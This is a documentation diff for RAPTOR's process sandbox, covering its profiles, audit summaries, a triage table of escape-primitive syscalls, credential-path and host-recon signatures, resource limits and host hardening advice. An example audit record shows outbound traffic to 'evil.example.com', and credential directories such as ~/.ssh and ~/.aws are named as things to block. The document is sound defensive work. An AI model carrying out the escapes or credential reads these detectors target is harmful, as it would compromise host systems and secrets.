-     "returncode": 137, "type": "seccomp", "profile": "full",
-     "suggested_fix": "syscall blocked by seccomp; use `--sandbox debug` (allows ptrace) or `--sandbox network-only`/`--sandbox none` (drops seccomp)"}
+    {"ts": "...", "cmd": "...", "returncode": 0, "type": "network",
+     "host": "evil.example.com", "port": 443, "audit": true,
+     "suggested_fix": "audit: outbound network to `evil.example.com` would be blocked under `--sandbox full`"}
   ]
 }
 ```
 
-`suggested_fix` references only the operator-facing CLI flags exposed by
-`add_cli_args` — `--sandbox {full,debug,network-only,none}`. Per-host or
-per-path overrides exist as sandbox API kwargs (`proxy_hosts`,
-`writable_paths`, `readable_paths`) but aren't exposed at the CLI level,
-so suggestions don't mention them. Generated regardless of profile, so
-even `--sandbox full` runs produce a summary.
+**2. Audit ran, no enforcement events** -- no `sandbox-summary.json`
+and no degraded marker. The workflow ran and nothing would have been
+blocked. (This is success.)
+
+**3. Audit was requested but did not actually run** --
+`sandbox-audit-degraded.json` is present. Follow the `instructions`
+field and rerun.
+
+---
+
+## Binary calibration
+
+Hardcoded sandbox allowlists drift: a provider adds an endpoint, an
+operator points pip at a corporate index, CodeQL pulls packs from a
+GHE host. The calibration tool runs a binary once under a permissive
+observed policy and caches the paths and hosts it actually touched
+(keyed on the binary's hash, under `~/.cache/raptor/sandbox-profiles/`),
+so allowlists can follow reality instead of hardcoded guesses:
+
+```bash
+libexec/raptor-sandbox-calibrate --bin <binary> [--json | --show | --force | --clear | --clear-all]
+```
+
+Calibration is a portability / drift-detection tool, NOT a security
+feature: by the time behaviour is observed, the binary has already
+executed once. The programmatic API (`calibrate_binary`,
+`load_or_calibrate`, `clear_cache`) lives in `core.sandbox.calibrate`.
+
+---
+
+## Observability
+
+Each sandboxed result carries a `sandbox_info` record: termination
+reason (`crashed`, `signal`), sanitizer detection, enforcement events,
+proxy events, and degradation stamps (`audit_engaged`,
+`mount_ns_degraded`, `proxy_enforcement`, `degraded_net_deny`) that
+tell you exactly which isolation tier a run actually got.
+
+`degraded_net_deny` means one specific thing: the per-call Landlock
+TCP-connect deny-all engaged because no namespace backend could
+deliver the requested network block. On seccomp-enabled profiles
+(`full`, `strict`, `debug`), this fallback also engages a seccomp
+filter blocking IPv4/IPv6 UDP socket creation, including DNS to the
+host's recursive resolver. The same requirement applies after a
+runtime namespace failure and during audit execution; audit does not
+relax the UDP deny. If the profile expects seccomp but libseccomp is
+unavailable, construction refuses with `SandboxSetupError` — the
+Landlock-only fallback cannot close the UDP egress path without it.
+
+A seccomp-less profile such as `network-only` can enforce the network
+block through a working network namespace. If that namespace is
+unavailable, the TCP-only fallback is refused: selecting a profile does
+not accept open UDP egress on behalf of a caller requesting a network
+block. This also applies after a runtime namespace failure.
+
+To resolve the refusal, enable network namespaces, or select a
+seccomp-enabled profile with working libseccomp. Callers that explicitly
+accept open networking on the fallback can pass
+`degraded_net_deny=False`. A containment-floor waiver does not waive the
+required UDP filter.
+
+Trusted tool execution (`run_trusted()`, profile `none`) is never
+affected — those profiles do not request network blocking.
+
+Its ABSENCE on a proxied run
+that resolved to the tier-2 `landlock_tcp` lane is a named contract,
+not an oversight — on that lane the proxy port allowlist is the live
+network policy and no deny-all engages, so read
+`proxy_enforcement` (`"landlock_tcp"` there) for the delivered
+network posture rather than inferring anything from the missing
+deny stamp.
+
+### Per-run denial summary
+
+For commands that go through the run lifecycle (everything driven by
+`/scan`, `/agentic`, `/codeql`, `/validate`, `/understand`, `/fuzz`),
+every sandbox enforcement event seen during the run is aggregated into
+`{run_dir}/sandbox-summary.json` at run-end. `suggested_fix` references
+only the operator-facing CLI flags.
 
 **Recovery from non-clean exits.** If a run dies before its lifecycle
-hook fires (hard kill, SIGKILL, OOM), the intermediate
-`.sandbox-denials.jsonl` is left on disk and `sandbox-summary.json`
-isn't written. Two paths recover it:
+hook fires:
 
-1. **Automatic** — the next time the same Claude Code session re-runs the
-   same command type (the Esc-then-retry pattern), `start_run`'s
-   `_cleanup_abandoned` sees the prior run still at `status=running`,
-   marks it `failed`, and `fail_run` routes through the standard
-   summary-finalize path. No operator action needed.
+1. **Automatic** -- the next time the same session re-runs the same
+   command type, the abandoned run is marked failed and its summary is
+   finalised through the standard path.
 
-2. **Manual** — for cases the auto-recovery doesn't cover (different
-   session, different command, host reboot, deliberate cleanup):
+2. **Manual**:
 
    ```bash
    # Single run.
    libexec/raptor-sandbox-summary <run_dir>
 
-   # All stranded runs under a project dir at once.
+   # All stranded runs under a project dir.
    libexec/raptor-sandbox-summary --sweep <project_dir>
    ```
 
-   Sweep mode iterates direct subdirectories, finalizes each one that
-   still has a `.sandbox-denials.jsonl`, and skips the rest (no JSONL
-   means either nothing was blocked or the summary is already written).
+If finalisation cannot open/read the claimed denial log or persist its
+summary, the warning names a retained `.sandbox-denials.jsonl.summarising.*`
+file. It stays beside the original log (normally under `.audit/`; older
+runs may use the run root). Each attempt uses a distinct name so later
+failures cannot overwrite earlier snapshots. Successful finalisation
+removes its snapshot after writing the summary. Retained snapshots are
+for inspection and manual recovery; the summary command and sweep do
+not replay them or replace newer evidence with them.
 
-### Crash signals across the pid-ns boundary
+### Sandbox triage and live escalation
 
-`unshare --pid --fork` makes the forked child pid-1 of the new pid-ns.
-Linux's pid-ns policy drops signals sent to pid-1 via `raise()` /
-`kill(self, ...)` unless the process has installed a handler (see
-`man 7 pid_namespaces`). If the target runs directly as pid-1, a
-self-signalled crash — `abort()`, explicit `raise(SIGFPE)` — exits
-`rc=0` and the sandbox sees a clean return where the target actually
-crashed. Nested-ns environments (Docker-in-CI, systemd-nspawn) can
-extend the filter to synchronous CPU exceptions too in some kernel
-combinations.
+On every terminal-state transition the lifecycle also runs a
+rules-based classifier over the run's sandbox telemetry and writes
+`{run_dir}/sandbox-triage.json`: a clean / notable / suspicious verdict
+distinguishing escape / recon / credential-theft signatures from
+ordinary "tool needed something the profile didn't allow" denial
+noise. Pure and offline — no LLM call, no network, no cost.
 
-The subprocess-path sandbox interposes `libexec/raptor-pid1-shim` so
-the target runs as **pid-3** of the new pid-ns, not pid-1:
+| Signal | Severity | Meaning |
+|--------|----------|---------|
+| `escape_primitive_denied` | high | denial matched the escape-primitive syscall sets (ptrace, bpf, keyctl, io_uring, ...) |
+| `hostile_syscall_argument` | high | denied syscall whose decoded arguments are themselves primitives (tty hijack ioctls, raw/packet sockets) |
+| `telemetry_tampering` | high | a triage input failed provenance verification |
+| `resolved_ip_screened` | high | a CONNECT resolved into a blocked IP range |
+| `credential_path_touch` | high | denial paths matched credential signatures |
+| `host_recon_pattern` | medium | distinct denied hosts over threshold (default 5) |
+| `volume_anomaly` | medium | denial volume near the per-run cap |
+| `seccomp_denied_unattributed` | low | non-audit run: a seccomp denial happened, syscall identity unknown |
 
-- shim (`/usr/bin/python3 -I`, pid-1) — reaps, forwards termination
-  signals (`SIGTERM`/`SIGINT`/`SIGHUP`/`SIGQUIT`) to the target,
-  mirrors exit status.
-- intermediate (pid-2) — exists only to escape process-group
-  leadership so the grandchild can `setsid()`.
-- target (pid-3) — executes the caller's command, session leader,
-  no controlling tty (so `open("/dev/tty")` returns ENXIO).
+The HIGH-severity signals also escalate LIVE to stderr the moment they
+fire — escalate-only, no enforcement change, no auto-kill. Set
+`RAPTOR_SANDBOX_LIVE_ESCALATION_DISABLED=1` to silence the live banners
+(the post-hoc `sandbox-triage.json` is unaffected).
 
-Because the shim is itself pid-1 it can't `raise()` the target's
-signal on itself either, so signal death is encoded using the
-standard unix `128+sig` exit-code convention. `observe._interpret_result`
-decodes both `rc<0` (direct-child signal death) and `128<rc<128+NSIG`
-(shim-mirrored signal death) to the same `sandbox_info["crashed"] = True`
-state, so downstream consumers don't need to know which path fired.
+Because the run dir is writable by the sandboxed target while it runs,
+every triage input the target could forge is stamped at write time with
+an HMAC token; content failing verification is excluded and fires
+`telemetry_tampering`. The token's strength depends on the run's
+posture: the key lives outside the run directory, but only a mount
+namespace or a `restrict_reads` read allowlist hides it from the child
+— on a read-unrestricted run (the Landlock-only `full`/`target_run`
+default) the target could read the key and mint valid tokens itself,
+so triage records the posture and demotes token-verified telemetry to
+legacy confidence on such runs (flagged in the report's caveats and
+`inputs.mac_key_posture`).
 
-Side-effect of the `-I` shebang on the shim interpreter: `PYTHONPATH`,
-`PYTHONHOME`, and `PYTHONSTARTUP` in the child env are ignored at
-interpreter startup, blocking a `sitecustomize.py` injection surface
-should a caller-supplied `env=` pass those names through (the default
-`get_safe_env()` strips them already — `-I` is belt-and-braces for
-callers that supply their own env).
+Re-run triage by hand (stranded runs, scripted gates), optionally with
+an LLM deeper-reasoning pass:
 
-The mount-ns path (`core/sandbox/_spawn.py`) handles pid-ns setup via
-its own `os.fork()` after `unshare(NEWPID)`, so the grandchild target
-is pid-2 of the new ns and this shim isn't required there.
+```bash
+libexec/raptor-sandbox-triage <run_dir> [--json] [--deep]
+# exit codes: 0 clean/no telemetry, 1 error, 2 usage, 3 notable, 4 suspicious
+```
+
+For CI admission, add `--require-evidence`. This returns exit code **1**
+when evidence is missing, cannot be authenticated, or records incomplete
+capture. Fully verified evidence retains the normal rules verdict and
+exit code. Ordinary inspection still treats absent telemetry as no report;
+`--require-evidence` cannot be combined with `--legacy`. Advisory `--deep`
+analysis cannot make missing or incomplete evidence pass this gate.
+
+`--deep` sends the provenance-verified triage report to the configured
+default LLM, which judges each signal as attack attempt vs tool noise.
+Advisory only: the rules verdict and exit code never change.
+
+### Campaign triage
+
+`raptor project correlate` correlates sandbox denial summaries across runs.
+It verifies each summary's provenance and run binding, then recomputes
+classification from its authenticated denial records. The editable `triage`
+buckets embedded in a summary do not drive campaign results. Legacy, forged,
+malformed, replayed, or known key-exposed summaries cannot supply trusted
+signatures. Missing evidence, unavailable provenance, degraded audits, and
+summaries reaching the denial cap remain explicit visibility gaps. Disabled
+sandbox runs, containment-floor refusals, sampling/budget markers, and
+authenticated per-run provenance warnings also prevent negative evidence. Such gaps
+set `integrity` to `degraded` and impose at least `elevated` campaign severity;
+that floor identifies uncertainty, not proof of an attack.
+
+Campaign output uses `schema_version: 2`. Each target has:
+
+- `signatures`: individual category/label identities, keyed by a stable hash of
+  the complete label. Identity precedes display truncation and example caps;
+  path case, internal whitespace, and distinct command tails remain distinct.
+- `categories`: separate category rollups, retaining category counts/examples.
+  Consumers of the old category-keyed `signatures` should read `categories`.
+- `runs_total`, `runs_with_triage`, and `runs_unknown`: all considered runs,
+  runs with verified denial summaries, and runs without complete usable
+  visibility. A verified but capped/degraded summary counts in both latter
+  fields: its positive observations remain useful, its absences do not.
+- `persistence`: the fraction of **all considered runs** observing a signature
+  or category. `persistence_upper` also includes unknown absences. Missing
+  telemetry therefore widens uncertainty instead of proving disappearance.
+- `trend`: `new`, `stable`, `resolved`, or `unknown`, using up to three recent
+  runs versus earlier runs. `new` and `resolved` require usable negative
+  evidence in the comparison window; an unobserved window is `unknown`.
+  `resolved` means absent from those observed summaries, not proven eliminated.
+
+Repeated individual signatures can raise severity after at least four verified
+runs; unrelated signatures sharing a category do not trigger that upgrade.
+Run metadata supplies target grouping and timestamps (directory name breaks
+ordering ties); the provenance claim applies to denial evidence, not to
+cryptographic authentication of every metadata label. Correlation reads run
+artifacts without rewriting them. If no telemetry evidence or surviving run
+metadata indicating triage exists anywhere, it returns no campaign result;
+complete erasure of both evidence and its surviving indicators cannot be
+inferred from these files alone.
+
+Whole-campaign correlation accepts at most 128 input run paths, 64 targets,
+4,096 distinct target/signature pairs and 32,000 attributed denial events.
+Repeated input paths still consume the path budget. On overflow, the result
+has degraded integrity and `aggregation.complete=false`, with the limit
+reason and no partial target trends. Severity retains known critical
+observations and is at least elevated when evidence remains unexamined.
+Split larger campaigns into deliberate review groups; an incomplete result
+must not be interpreted as a clean campaign or resolved signatures.
+
+Coverage remains bounded by the telemetry collected. In-kernel hard denials
+can bypass tracer notification, so enforcement does not imply attribution of
+every attempt. macOS containment likewise does not establish detection parity
+with Linux. Campaign triage does not add automatic killing or LLM verdict
+rewriting.
+
+---
+
+## Resource limits
+
+Every sandboxed child gets rlimit caps alongside the isolation
+layers. Defaults (override per limit in
+`~/.config/raptor/sandbox.json`, or per call via `limits={...}`):
+
+| Key | Default | rlimit | Notes |
+|---|---|---|---|
+| `memory_mb` | `0` (off) | `RLIMIT_AS` | Deliberately off: ASAN-instrumented targets reserve ~56 TiB of shadow VA and break under ANY finite cap, and `/validate` PoCs run ASAN through the untrusted entry points. Set a value only for workloads you know are ASAN-free; use cgroup `memory.max` for a real RAM bound. |
+| `max_file_mb` | `~10240` (+ per-install jitter) | `RLIMIT_FSIZE` | Caps a single written file (10 GB accommodates debug builds and corpora). |
+| `cpu_seconds` | `~3600` (+ jitter) | `RLIMIT_CPU` | Soft limit fires SIGXCPU 1s before the hard kill. |
+| `nproc` | `~1024` (+ jitter) | `RLIMIT_NPROC` | Namespace paths count it against the ns-local uid (nobody = zero pre-existing processes). On the Landlock-only path (no user namespace) the same budget is applied as an absolute ceiling of current-same-uid-process-count + `nproc`, bounding fork bombs without counting the operator's unrelated work. The macOS seatbelt lane applies the same relative ceiling (count via `ps`; macOS `RLIMIT_NPROC` counts the user's processes host-wide), bounded by the kernel's silent `kern.maxprocperuid` clamp — macOS stores at most that value whatever is requested, so the lane requests the honoured number. |
+| `nofile` | `~4096` (+ jitter) | `RLIMIT_NOFILE` | Bounds fd-exhaustion DoS; clamped to the inherited hard limit. `0` disables. |
+
+Defaults carry a small deterministic per-install surplus (stable
+within an install, different across installs) so the exact tuple is
+not a published fingerprint; explicit operator overrides are used
+verbatim.
+
+Example `~/.config/raptor/sandbox.json`:
+
+```json
+{
+    "memory_mb": 8192,
+    "max_file_mb": 20480,
+    "nofile": 8192
+}
+```
+
+---
+
+### Job-wide Linux cgroup budgets
+
+Untrusted entry points accept `job_budget={...}` and also read a standing
+`job_budget` object from the existing `~/.config/raptor/sandbox.json` file.
+An explicit per-call object replaces the standing object. Trusted-tool calls
+do not pick up standing job budgets. For example:
+
+```json
+{
+  "memory_mb": 0,
+  "job_budget": {
+    "memory_max": 8589934592,
+    "cpu_max": [100000, 100000],
+    "pids_max": 1024,
+    "required": true
+  }
+}
+```
+
+`memory_max` is a kernel-accounted aggregate memory byte ceiling; `cpu_max` is `[quota_us, period_us]`
+for the job, not a total CPU-time allowance. `pids_max` bounds tasks in the
+job. All requested values must be finite and positive. Existing rlimits remain
+in place; no virtual-address-space cap is enabled by this feature, preserving
+ASAN compatibility. No budgets are invented when no job policy is configured.
+
+The operator must provide a writable delegated cgroup v2 subtree with the
+requested controllers already enabled for children. RAPTOR tries the process's
+current group and its existing systemd `user@UID.service` delegation, requiring
+a user-owned writable parent with the requested controllers enabled for
+children. `parent` can name another delegated absolute path under
+`/sys/fs/cgroup`. The invoking process must also have permission to move its
+own children into that delegation. RAPTOR creates only its own leaf, never changes parent
+controller settings, and does not require or obtain broad privileges.
+
+The initial implementation requires the full Linux mount/PID namespace lane.
+It hides the watcher, masks `/sys/fs/cgroup`, and refuses declared path or
+descriptor grants that would hand back writable cgroup controls. It installs
+and reads back controls while the leaf is empty, attaches the trusted setup
+child before the payload's launch gate opens, and keeps descendants in that
+job. A separate trusted watcher remains outside the job: normal completion,
+timeout, setup failure or owner death stops the whole leaf and waits for its
+population to reach zero. Usage counters are read before removal. A bounded signed cleanup receipt is
+appended through a parent-opened evidence descriptor, including after owner
+death; missing or unverifiable receipts remain a visibility gap. Kernel tasks
+that cannot be reaped within the bounded cleanup period produce a visible
+cleanup failure, rather than a claim that the job stopped.
+
+Budgets are required by default. Missing delegation/controllers, an unsupported
+lane or failed admission refuses before payload execution. `required: false`
+explicitly permits an unavailable budget to use rlimits alone, with a warning
+and an `unavailable` record. A prepared job may not silently follow a later
+weaker fallback, even when originally optional. Mountless and PID-namespace
+bypass lanes cannot claim this first version of required job containment. macOS has no cgroup
+backend. I/O controller budgets are not part of this first version.
+
+Each result's `sandbox_info.job_budget` records requested and effective values,
+admission status, usage, and verified cleanup. Failed admission or cleanup
+carries the same record on `JobBudgetError`; execution exceptions such as
+`TimeoutExpired` also retain `job_budget` after cleanup. Required budgets do not lower any
+filesystem, network or containment-floor requirement.
+
+### Per-run activity report
+
+Run finalisation writes three private artifacts:
+
+- `sandbox-activity.jsonl`: bounded normalised events with source, timestamp,
+  process when known, action, resource and outcome;
+- `sandbox-activity-summary.json`: counts, coverage gaps, a digest of the event
+  stream and provenance token;
+- `sandbox-activity.txt`: a readable activity and coverage summary.
+
+The report joins parent-owned process completion and job-budget receipts with
+verified denial and proxy evidence. Protected observe records add individual path and connection attempts when
+observation engaged, preserving source timestamps and PIDs where present.
+The existing profile parser supplies provenance and capture-quality checks;
+an attempted open is not proof that a file was read. Missing timestamps, PIDs
+and operation outcomes remain unknown. Event sequence is ingestion
+order, not a fabricated global timeline. Unauthenticated input is excluded
+with a coverage warning. New proxy activity signatures also bind timing,
+ports and byte counts; legacy records retain their verified destination and
+decision while unsigned details remain unknown. Informational allowed policy
+records need their separate activity signature. A known key-exposed run cannot claim verified parent
+provenance; verification requires an independently known key-hiding posture.
+
+Coverage distinguishes disabled, degraded, truncated and unavailable inputs.
+An empty event list never proves that no activity occurred. Collection is
+bounded to 4096 events and 2 MiB of normalised event content per run; reaching a
+bound is disclosed. Files are written with mode `0600`; displayed fields are
+bounded, terminal-sanitised and secret-redacted. Paths and destinations remain
+sensitive evidence and should be shared deliberately.
+
+HTTPS reporting covers CONNECT destinations and tunnel decisions/bytes, not
+encrypted HTTP methods or paths. DNS reporting covers proxy resolution, not a
+complete DNS query log. This version adds neither TLS interception nor a DNS
+listener. `/scorecard` remains about model reliability.
+
+## When the sandbox cannot engage
+
+`SandboxSetupError` is raised when sandbox isolation could not engage
+for a run. It deliberately propagates past broad exception handlers
+that would otherwise swallow the failure and produce a false "0
+findings" result. CLI subprocesses print the actionable message and
+exit with code **3**; the error carries the kernel diagnostic and the
+operator's next step.
+
+Policy: RAPTOR does NOT auto-degrade to weaker isolation when the
+requested profile cannot engage. The operator resolves it explicitly
+(e.g. `--sandbox network-only`).
+
+### OS-capability degradation map
+
+Sandbox behaviours — and the test families that exercise them — key on
+truthful runtime probes, not on binary presence alone. When a
+capability is genuinely absent the affected behaviour degrades by
+design and the corresponding tests skip with the missing capability
+named (never error); everywhere the capability exists they run
+unchanged.
+
+| OS capability | Sandbox behaviour it gates | Tests |
+|---|---|---|
+| Unprivileged user namespaces, incl. the staged second pid-ns unshare | namespace backend selection (network/PID/IPC isolation) | `requires_userns` families |
+| — when user namespaces are absent entirely, the sandbox runs in the **Landlock-only posture**. Still enforced: the Landlock read/write allowlists (`restrict_reads` included), the seccomp policy, rlimits, a private per-run scratch directory replacing the blanket `/tmp` + `/dev/shm` grants, and the degraded TCP-connect deny (Landlock ABI v4+). Also still enforced: Landlock's ptrace scoping — the sandboxed process **cannot read `/proc/<pid>/environ` or `/proc/<pid>/mem` of any process outside its sandbox domain**, on any Yama `ptrace_scope` setting (the Landlock domain gates the kernel's ptrace-mode access checks those files require). NOT enforced: no PID/network/IPC namespaces and no UID remapping — host processes stay **visible** in `/proc` (enumeration, and world-readable entries such as `cmdline`/`stat`/`status` are readable), and filesystem metadata operations (rename/delete within allowed dirs) are unrestricted | host-pid environ tests skip with the posture named; the Landlock-only environ pin asserts the domain-scoped denial against the live kernel, with an unsandboxed same-UID control read proving the denial comes from the sandbox, not from host configuration |
+| `unshare(CLONE_NEWNS)` + `mount(2)` in an owned userns, plus `newuidmap`/`newgidmap` | mount-ns tier: bind tree, fresh `/tmp`, read-only root | `requires_mount` families |
+| Landlock (ABI v4+ for the degraded TCP-connect deny) | filesystem confinement; network deny fallback | `requires_landlock` families |
+| subuid/subgid-range id-maps — impossible inside an unprivileged NESTED user namespace (rootless container, namespaced test runner): the range is unmapped in the writer's namespace, so the kernel refuses the write regardless of `/etc/subuid` or the setuid helpers | rootfs (image) mode's range map; setup fails closed, and the error names the nested-userns cause when detected | rootfs E2E family probes the exact `newuidmap` invocation up front and skips with the reason |
+| A FOREIGN (root-owned) init user namespace — absent when pid 1 is the runner's own init inside a nested userns | none (refusal-test posture only) | foreign-namespace refusal tests (pytest and the C harness pid-1 case) skip when pid 1's userns is self-owned |
+| A promptly-reaping init for re-parented orphans — a pid-namespace init that never `wait()`s keeps killed orphans visible as zombies | none (process-teardown observability only) | kill/reap tests read `/proc/<pid>/stat` state, so dead-but-unreaped counts as killed (hermetic — no skip) |
+
+---
+
+## Supervised process trees (not a sandbox)
+
+RAPTOR sometimes needs a long-running helper -- an analysis server, a
+JVM, a tool daemon -- that must reliably disappear when it is stopped
+or when the RAPTOR process that owns it dies, taking every descendant
+it spawned with it. `core.sandbox.supervised.spawn_supervised()` is
+that primitive: a teardown domain, **not a security boundary**.
+
+A supervised tree gets **no confinement of any kind** -- no Landlock,
+no seccomp, no filesystem or network policy. The helper runs with the
+caller's full ambient authority. Anything untrusted belongs under the
+sandbox profiles above, never under supervision alone.
+
+Two tiers, selected automatically:
+
+- **pidns** -- the tree runs in its own PID namespace with a minimal
+  init process. Stopping the tree, or the owner's death (in `kill`
+  mode), collapses the namespace: the kernel itself guarantees no
+  descendant survives, including double-forked daemons. Optionally a
+  private network namespace (loopback only) can be added. Namespace
+  setup writes the deny-setgroups sequence and identity uid/gid maps
+  (`_ns_setup`), so the tree's effective uid is always mapped in its
+  user namespace: workloads inside may themselves create nested
+  namespaces where host policy allows -- an unmapped euid would make
+  a nested `unshare(CLONE_NEWUSER)` fail with EPERM.
+- **group** -- on hosts where unprivileged user namespaces are
+  restricted, the same call degrades -- loudly (a logged warning
+  names the refusal and the weaker teardown scope), never a crash --
+  to a plain process group with parent-death kill: the exact posture
+  RAPTOR tool spawns already had, so nothing gets worse. This tier's
+  honest gap: a descendant that leaves the process group (setsid, a
+  double-forked daemon) is invisible to group-scoped teardown and
+  survives it. Callers that need the namespace guarantee pass
+  `pid_ns="require"`, which refuses instead of degrading.
+
+  The group tier's kill verification reads `/proc`, so it defends the
+  evidence it reads: each scan holds one private fd on
+  `/proc/self/mounts` (checked to really be procfs where `fstatfs` is
+  available), which latches the kernel's mount-event signal for the
+  whole scan window. Any mount-table change during the scan --
+  including an overmount attached and detached entirely between the
+  scan's own reads -- marks the scan occluded instead of trusted;
+  churn-occluded scans are retried on a fresh fd a bounded number of
+  times (declared-state and failed-read occlusion is never retried),
+  after which the calling verification paths refuse loudly. This
+  NARROWS the `/proc`-masking channel, it does not close it: a
+  hidepid-class superblock flip made from a sibling mount namespace
+  does not fire the mount-event signal (a persisting flip is still
+  declared by the scan's ordinary reads, and the channel is bounded
+  to cross-uid group members); fully forged `/proc` content served
+  through an undetected mask remains out of scope for a `/proc`-based
+  proof. The death corroboration's per-member `/proc/<pid>/task`
+  reads run inside the same latched window -- after the membership
+  walk, before the scan's second declaration read and its verdict
+  poll -- and their verdict travels on the scan result, so no
+  verification path re-reads `/proc` after the scan's fd closed: a
+  mount attached after the scan cannot forge the task-tree evidence a
+  verify consumes (it can only affect the next scan, whose own latch
+  and declaration reads cover it). On kernels without the mounts poll
+  hook the signal simply never fires and the scan degrades to its
+  two-declaration-read posture over the whole window, task reads
+  included: a persisting mask is still declared, but a mask attached
+  and detached entirely inside the window -- the task reads' span
+  included -- goes undetected there. A co-resident able to churn
+  mounts (for example via a setuid FUSE helper) can delay or force
+  loud refusal of verification -- never a silent false verify on
+  kernels with the mounts poll hook; without it that guarantee
+  narrows by exactly the in-window attach-and-detach blindness just
+  priced -- and kills themselves are never suppressed by occlusion.
+
+Every spawn states its fate explicitly: `on_parent_death="kill"` ties
+the tree's lifetime to the owning process; `"survive"` lets it outlive
+the owner (for shared servers that later runs reattach to). Teardown
+is verified, never assumed -- on the pidns tier a stop call returns
+only once the kernel has proven the tree empty; on the group tier the
+proof is scoped to the process group (see the gap above). On either
+tier, a stop that cannot prove its claim reports an error and leaves
+the handle retryable.
+
+Because supervision is not a sandbox, it appears in none of the
+profile or containment-floor tables above, and no consent surface
+applies to it.
+
+---
+
 ## Toolchain env for builds
 
-The sandbox's `get_safe_env()` keeps a tight allowlist and deliberately
-strips language-specific vars like `JAVA_HOME`, `GOROOT`, `DOTNET_ROOT`,
-`RUSTUP_HOME` — adding them globally would broaden exposure for every
-non-that-language caller. Instead, each build-system entry in
-`packages/codeql/build_detector.BUILD_SYSTEMS` declares an
-`env_detect` list, and `core/build/toolchain.py` auto-resolves those
-vars from filesystem layout (e.g. `/usr/lib/jvm/default-java`, or
-`readlink -f $(which java)`) at build time.
+Environment sanitisation deliberately strips language-specific vars
+like `JAVA_HOME`, `GOROOT`, `DOTNET_ROOT`, `RUSTUP_HOME`. Build
+subprocesses get those auto-resolved from filesystem layout at build
+time instead — and only the build subprocess sees them.
 
-Scope: detected values land in the build subprocess's env ONLY —
-scanners, LLM sub-agents, the proxy thread, and other sandbox calls
-in the same context do not see them. See `~/design/env-handling.md`
-for the full design and deferred items (user-provided build env,
-target-runtime env, macOS detector paths).
+If a build tool still fails with "JDK not found" or similar: install
+the toolchain into a standard location for your distro.
 
-If the build tool still fails with "JDK not found" or similar:
-install the toolchain into a standard location, or expand the
-detector fallback chain in `core/build/toolchain.py` for your distro.
+---
+
+## Host-fingerprint sanitisation
+
+Opt-in (`sandbox(..., sanitise_host_fingerprint=True)`): the mount-ns
+child bind-mounts canonical files over the host's identity surfaces
+(`/proc/cpuinfo`, `/proc/version`, `/etc/os-release`,
+`/etc/machine-id`, `/etc/hostname`, DMI vendor/product, UTS
+nodename/domainname, CPU affinity) so a hostile target that
+fingerprints its environment sees a boring Debian 12 cloud VM on
+QEMU/KVM instead of analysis infrastructure. The `/etc/passwd` and
+`/etc/group` tables are replaced with neutral stubs, so the operator's
+username never reaches the target. Capability surfaces stay real (CPU
+flags, kernel release, arch, mitigation sysctls) so exploit
+feasibility analysis keeps working. The persona defaults to claiming
+4 CPUs; pass `cpu_count=HOST_CPU_COUNT` to expose the real count for
+parallelism-hungry targets.
+
+The persona only exists on the full mount-ns lane. On a demoted
+(Landlock-only) lane it cannot apply: by default the run proceeds with
+a one-shot WARNING; with `require_sanitisation=True` it refuses
+instead of degrading silently. Linux only — on macOS
+`is_supported()` is False and callers soft-degrade with a warning.
+Known residuals (direct `cpuid` execution, `AT_HWCAP`) are documented
+in `core/sandbox/fingerprint.py`.
+
+---
+
+## Platform support
+
+### Linux (full isolation)
+
+All six layers are available: user namespace, network namespace, PID
+namespace, IPC namespace, mount namespace, Landlock + seccomp-bpf +
+rlimits. Each layer probes for kernel support independently at first
+use.
+
+Landlock coverage grows with kernel version: the TCP-connect allowlist
+needs kernel 6.7+, truncation restriction 6.2+, device-ioctl deny
+6.10+, and signal/abstract-socket scoping 6.12+. Missing pieces are
+announced with a one-shot notice, never silently assumed.
+
+### macOS (Seatbelt)
+
+On Darwin, the sandbox routes through `sandbox-exec(1)` with an SBPL
+profile. The same profiles, flags, egress proxy, audit budget, and
+summary/triage output work identically. Platform limits: no PID or
+mount namespaces (the read restriction is the substitute), process
+caps are per-UID host-wide, syscall filtering is coarser, and host
+fingerprint sanitisation is unavailable. Under `--sandbox debug`,
+process-info denies are skipped so lldb/sample/dtrace can attach.
+
+Under the hardened profiles, process-info and signals stay open to
+processes inside the same sandbox instance (the PID-namespace
+analogue), so parents can watch and reap their own children; host
+processes and other sandbox runs stay unreachable. The mach-lookup
+allowlist closes the keychain, so children get
+`NIX_SSL_CERT_FILE=/etc/ssl/cert.pem` for file-based trust anchors
+(Semgrep's OCaml TLS stack reads it). `(deny network*)` also denies
+bind/listen, so RAPTOR's own dispatched children behind the egress
+proxy (the SCA agent) route their HTTP clients through the parent
+proxy instead of starting an in-child one.
+
+---
+
+## Host and network perimeter
+
+RAPTOR's sandbox isolates individual subprocesses — it cannot secure
+the host it runs on. The sandbox is one layer of defence in depth;
+the layers below it are the operator's responsibility.
+
+### Dedicated execution environment
+
+Run RAPTOR inside a dedicated VM or container whose compromise does
+not grant lateral movement to production systems, developer
+workstations, or credential stores. Treat the analysis host as
+disposable infrastructure.
+
+### UID hygiene
+
+The UID running the Claude Code session (and therefore RAPTOR) should
+be an unprivileged, purpose-specific account:
+
+- Not in `sudoers`, `wheel`, `docker`, `lxd`, `disk`, `adm`, or any
+  group that grants privilege escalation or raw device access.
+- No `NOPASSWD` sudo rules. No polkit authorisations.
+- No access to host credentials (`~/.ssh`, `~/.aws`,
+  `~/.config/gcloud`, `~/.kube`). The sandbox blocks reads from
+  inside sandboxed children; the UID having no access in the first
+  place closes the gap for unsandboxed processes in the same session.
+- Home directory should contain only the analysis workspace — nothing
+  else of value.
+
+### Mandatory access control
+
+Confine the session UID with SELinux or AppArmor:
+
+- **SELinux:** a dedicated type (e.g. `raptor_t`) with a policy that
+  denies network connect except to the egress proxy port, denies
+  write to anything outside the workspace and `/tmp`, and denies
+  transitions to privileged domains.
+- **AppArmor:** a profile that achieves the same — deny network,
+  restrict filesystem writes, deny capability acquisition and
+  mount/ptrace.
+
+MAC enforcement is orthogonal to RAPTOR's own Landlock/seccomp
+filters and stacks with them. It catches anything that escapes the
+process-level sandbox or runs outside it.
+
+### Network egress controls
+
+RAPTOR's egress proxy and seccomp UDP block operate inside the host.
+A compromised process that escapes the sandbox can bypass both.
+Network policy must be enforced at a layer the host cannot subvert:
+
+- **Upstream HTTP proxy (recommended).** Set `HTTPS_PROXY` to a
+  corporate or infrastructure proxy with a default-deny allowlist.
+  RAPTOR's egress proxy honours `HTTPS_PROXY` and tunnels through it
+  transparently. The upstream proxy becomes the network-level
+  chokepoint — only explicitly allowed destinations are reachable,
+  regardless of what happens on the analysis host.
+- **Host firewall.** Apply iptables/nftables rules or a security
+  group that drops all egress except to the upstream proxy (and SSH
+  for operator access). Deny DNS directly from the host — force it
